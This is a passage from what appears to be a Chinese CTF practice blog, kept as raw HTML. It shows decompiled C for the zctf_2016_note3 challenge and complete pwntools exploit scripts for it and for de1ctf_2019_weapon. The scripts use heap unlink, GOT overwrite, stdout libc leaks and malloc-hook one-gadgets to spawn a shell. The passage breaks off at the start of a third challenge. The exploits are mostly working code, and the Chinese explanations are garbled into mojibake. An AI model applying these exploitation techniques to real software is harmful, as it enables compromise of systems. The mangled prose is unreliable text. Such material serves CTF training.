punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>v0 <span class="token operator">>></span> <span class="token number">63</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v0     <span class="token operator">-</span> <span class="token number">7</span>     <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">signed</span> __int64<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int128<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">5270498306774157605LL</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> __int128<span class="token punctuation">)</span>v0<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>v0 <span class="token operator">>></span> <span class="token number">63</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>=</span> v0 <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v1 <span class="token operator">=</span> ptr<span class="token punctuation">[</span>v3<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Input the new content:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">sub_4008DD</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>ptr<span class="token punctuation">[</span>v3<span class="token punctuation">]</span><span class="token punctuation">,</span> qword_6020C0<span class="token punctuation">[</span>v3 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      qword_6020C0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>ptr<span class="token punctuation">[</span>v3<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token function">LODWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Edit success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">LODWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"please input correct id."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v1<span class="token punctuation">;</span></code></pre><p>å…¶ä¸­çš„<strong>sub_4008DD</strong>å‡½æ•°å¦‚ä¸‹</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">sub_4008DD</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> <span class="token keyword">char</span> a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-34h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+2Fh] [rbp-11h]</span>  <span class="token keyword">unsigned</span> __int64 i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+30h] [rbp-10h]</span>  ssize_t v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+38h] [rbp-8h]</span>  v4 <span class="token operator">=</span> a3<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span> a2 <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">></span> i<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v7 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> buf <span class="token operator">==</span> v4 <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> i<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>ä»¥forå¾ªç¯è¯»å…¥å†…å®¹ï¼Œåˆ¤æ–­æ¡ä»¶æ˜¯<strong>a2 - 1 &gt; i</strong>è¿™é‡Œçš„a2æ˜¯æˆ‘ä»¬ç”³è¯·chunkæ—¶è¾“å…¥çš„sizeï¼Œè€Œ<strong>i</strong>æ˜¯ä¸€ä¸ªæ— ç¬¦å·æ•´å‹æ•°ï¼Œæœ‰ç¬¦å·æ•´å‹æ•°å’Œæ— ç¬¦å·æ•´å½¢æœ¯ä½œæ¯”è¾ƒä¼šå…ˆå°†æœ‰ç¬¦å·æ•°è½¬ä¸ºæ— ç¬¦å·æ•°ï¼Œå†åšæ¯”è¾ƒã€‚å½“æˆ‘ä»¬è¾“å…¥çš„size=0æ—¶ï¼Œå‡è®¾æ­¤æ—¶i=0ï¼Œint(0-1)å’Œunsigned int(0)ä½œæ¯”è¾ƒï¼Œæˆ‘å†™äº†ä¸€ä¸ªdemoï¼Œèƒ½æ›´æ¸…æ¥šçš„çœ‹åˆ°ç»“æœ</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> a<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> b<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token number">-1</span><span class="token operator">></span>b<span class="token punctuation">)</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/31.jpg" alt=""></p><p>æ‰€ä»¥ï¼Œåªè¦æˆ‘ä»¬è¾“å…¥çš„sizeä¸º0ï¼ŒeditåŠŸèƒ½å°±å¯ä»¥æ— é™åˆ¶è¾“å…¥ï¼Œå‰©ä¸‹çš„å°±æ˜¯unlinkäº†ï¼Œunlinkåˆ°0x6020c8-0x18ï¼Œç„¶åè¯¥æ”¹å•¥æ”¹å•¥</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./zctf_2016_note3'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./zctf_2016_note3'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io = remote('node3.buuoj.cn', 25470)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'zctf_2016_note3'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"option--->>"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"(less than 1024)"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"option--->>"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"option--->>"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>ptr <span class="token operator">=</span> <span class="token number">0x6020c8</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ptr<span class="token number">-0x18</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ptr<span class="token number">-0x10</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 1</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 2</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 3</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(io)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>atoi_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'puts_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>atoi_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> atoi_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"option--->>"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0xe-de1ctf-2019-weapon"><a href="#0xe-de1ctf-2019-weapon" class="headerlink" title="0xe.de1ctf_2019_weapon"></a>0xe.de1ctf_2019_weapon</h2><p>è¿™é¢˜æ˜¯æˆ‘æ¥è§¦çš„ç¬¬ä¸€é“é€šè¿‡stdoutæ³„éœ²libcåœ°å€çš„é¢˜ç›®ï¼Œå½“åˆæ‹¿ç€å¤§ä½¬çš„expä¸€æ­¥æ­¥è°ƒçš„ï¼Œåšæ³•è·Ÿnpuctfçš„badguyå·®ä¸å¤šçš„ï¼Œå°±ä¸ç»†ğŸ”’äº†ï¼Œç›´æ¥ä¸Šå¤§ä½¬çš„exp</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice >> \n'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size of weapon: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice >>'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'input idx :'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">rename</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice >>'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'input idx: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'new content:'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># raw_input()</span>    create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'bbbb'</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'bbbb'</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'cccc'</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    rename<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'\x18'</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'aaaa'</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'\xdd\x25'</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'aaaa'</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    rename<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'\x30'</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'aaaa'</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'aaaa'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#gdb.attach(t)</span>    create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>    rename<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> cyclic<span class="token punctuation">(</span><span class="token number">51</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> <span class="token string">'\x08'</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">57</span><span class="token punctuation">)</span>    addr_libc <span class="token operator">=</span> u64<span class="token punctuation">(</span>t<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">200</span> <span class="token operator">-</span> <span class="token number">0x3c5540</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'[+] libc_base: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>addr_libc<span class="token punctuation">)</span><span class="token punctuation">)</span>    magic <span class="token operator">=</span> addr_libc <span class="token operator">+</span> <span class="token number">0xf1147</span>    addr_hook <span class="token operator">=</span> addr_libc <span class="token operator">+</span> <span class="token number">0x3c4b10</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'[+] addr_hook: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>addr_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'aaaa'</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'aaaa'</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    rename<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>addr_hook <span class="token operator">-</span> <span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'aaaa'</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> cyclic<span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>magic<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice >> \n'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size of weapon: '</span><span class="token punctuation">,</span> <span class="token string">'10'</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index: '</span><span class="token punctuation">,</span> <span class="token string">'8'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true">#t = remote('node3.buuoj.cn', 28913)</span>            t <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./de1ctf_2019_weapon'</span><span class="token punctuation">)</span>            exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>            t<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            t<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">continue</span></code></pre><h2 id="0xf-OGeek2019-bookmanager"><a href="#0xf-OGeek2019-bookmanager" class="headerlink" title="0xf.[OGeek2019]bookmanager"></a>0xf.[OGeek2019]bookmanager</h2><p>è¿™é¢˜ï¼ŒğŸ‘´è¿˜æ˜¯å¤ªèœäº†ï¼Œç¢°åˆ°è¿™ç§ä»£ç é‡å·¨å¤§çš„é¢˜ç›®å°±æ˜äº†å¤´ï¼Œæ»¡çœ¼çš„*ï¼Œå¤ªé¡¶äº†ï¼ŒğŸ‘´çš„ä»£ç å®¡è®¡èƒ½åŠ›è¿˜æ˜¯å¼±çš„ä¸€æ‰¹ã€‚</p><p>è¿™é¢˜æˆ‘çœ‹çš„exå¸ˆå‚…çš„expè°ƒè¯•çš„ï¼Œç”±äºç¨‹åºæœ‰å…«ä¸ªåŠŸèƒ½ï¼ŒğŸ‘´åšé¢˜æ—¶çœ‹åˆ°ç¬¬äºŒä¸ªåŠŸèƒ½å°±èäº†ï¼Œå¤ªé•¿ğŸŒ¶ï¼ŒğŸ‘´å—â‘§äº†ï¼Œç›´æ¥å°±ä¸Šç½‘æœäº†ä¸€æ³¢expï¼Œæ‹¿ç€exå¸ˆå‚…çš„expè°ƒè¯•å®Œåå°±ä¸€æŠŠæ¢­ï¼Œè¿™æ ·è¿˜æ˜¯ä¸å¥½ï¼Œæ‰€ä»¥åœ¨è¿™é‡ŒæŠŠæ•´ä¸ªç¨‹åºçš„åŠŸèƒ½å®ç°å®Œæ•´çš„å¤ç°ä¸€é</p><p>é¦–å…ˆæ˜¯mainå‡½æ•°</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span 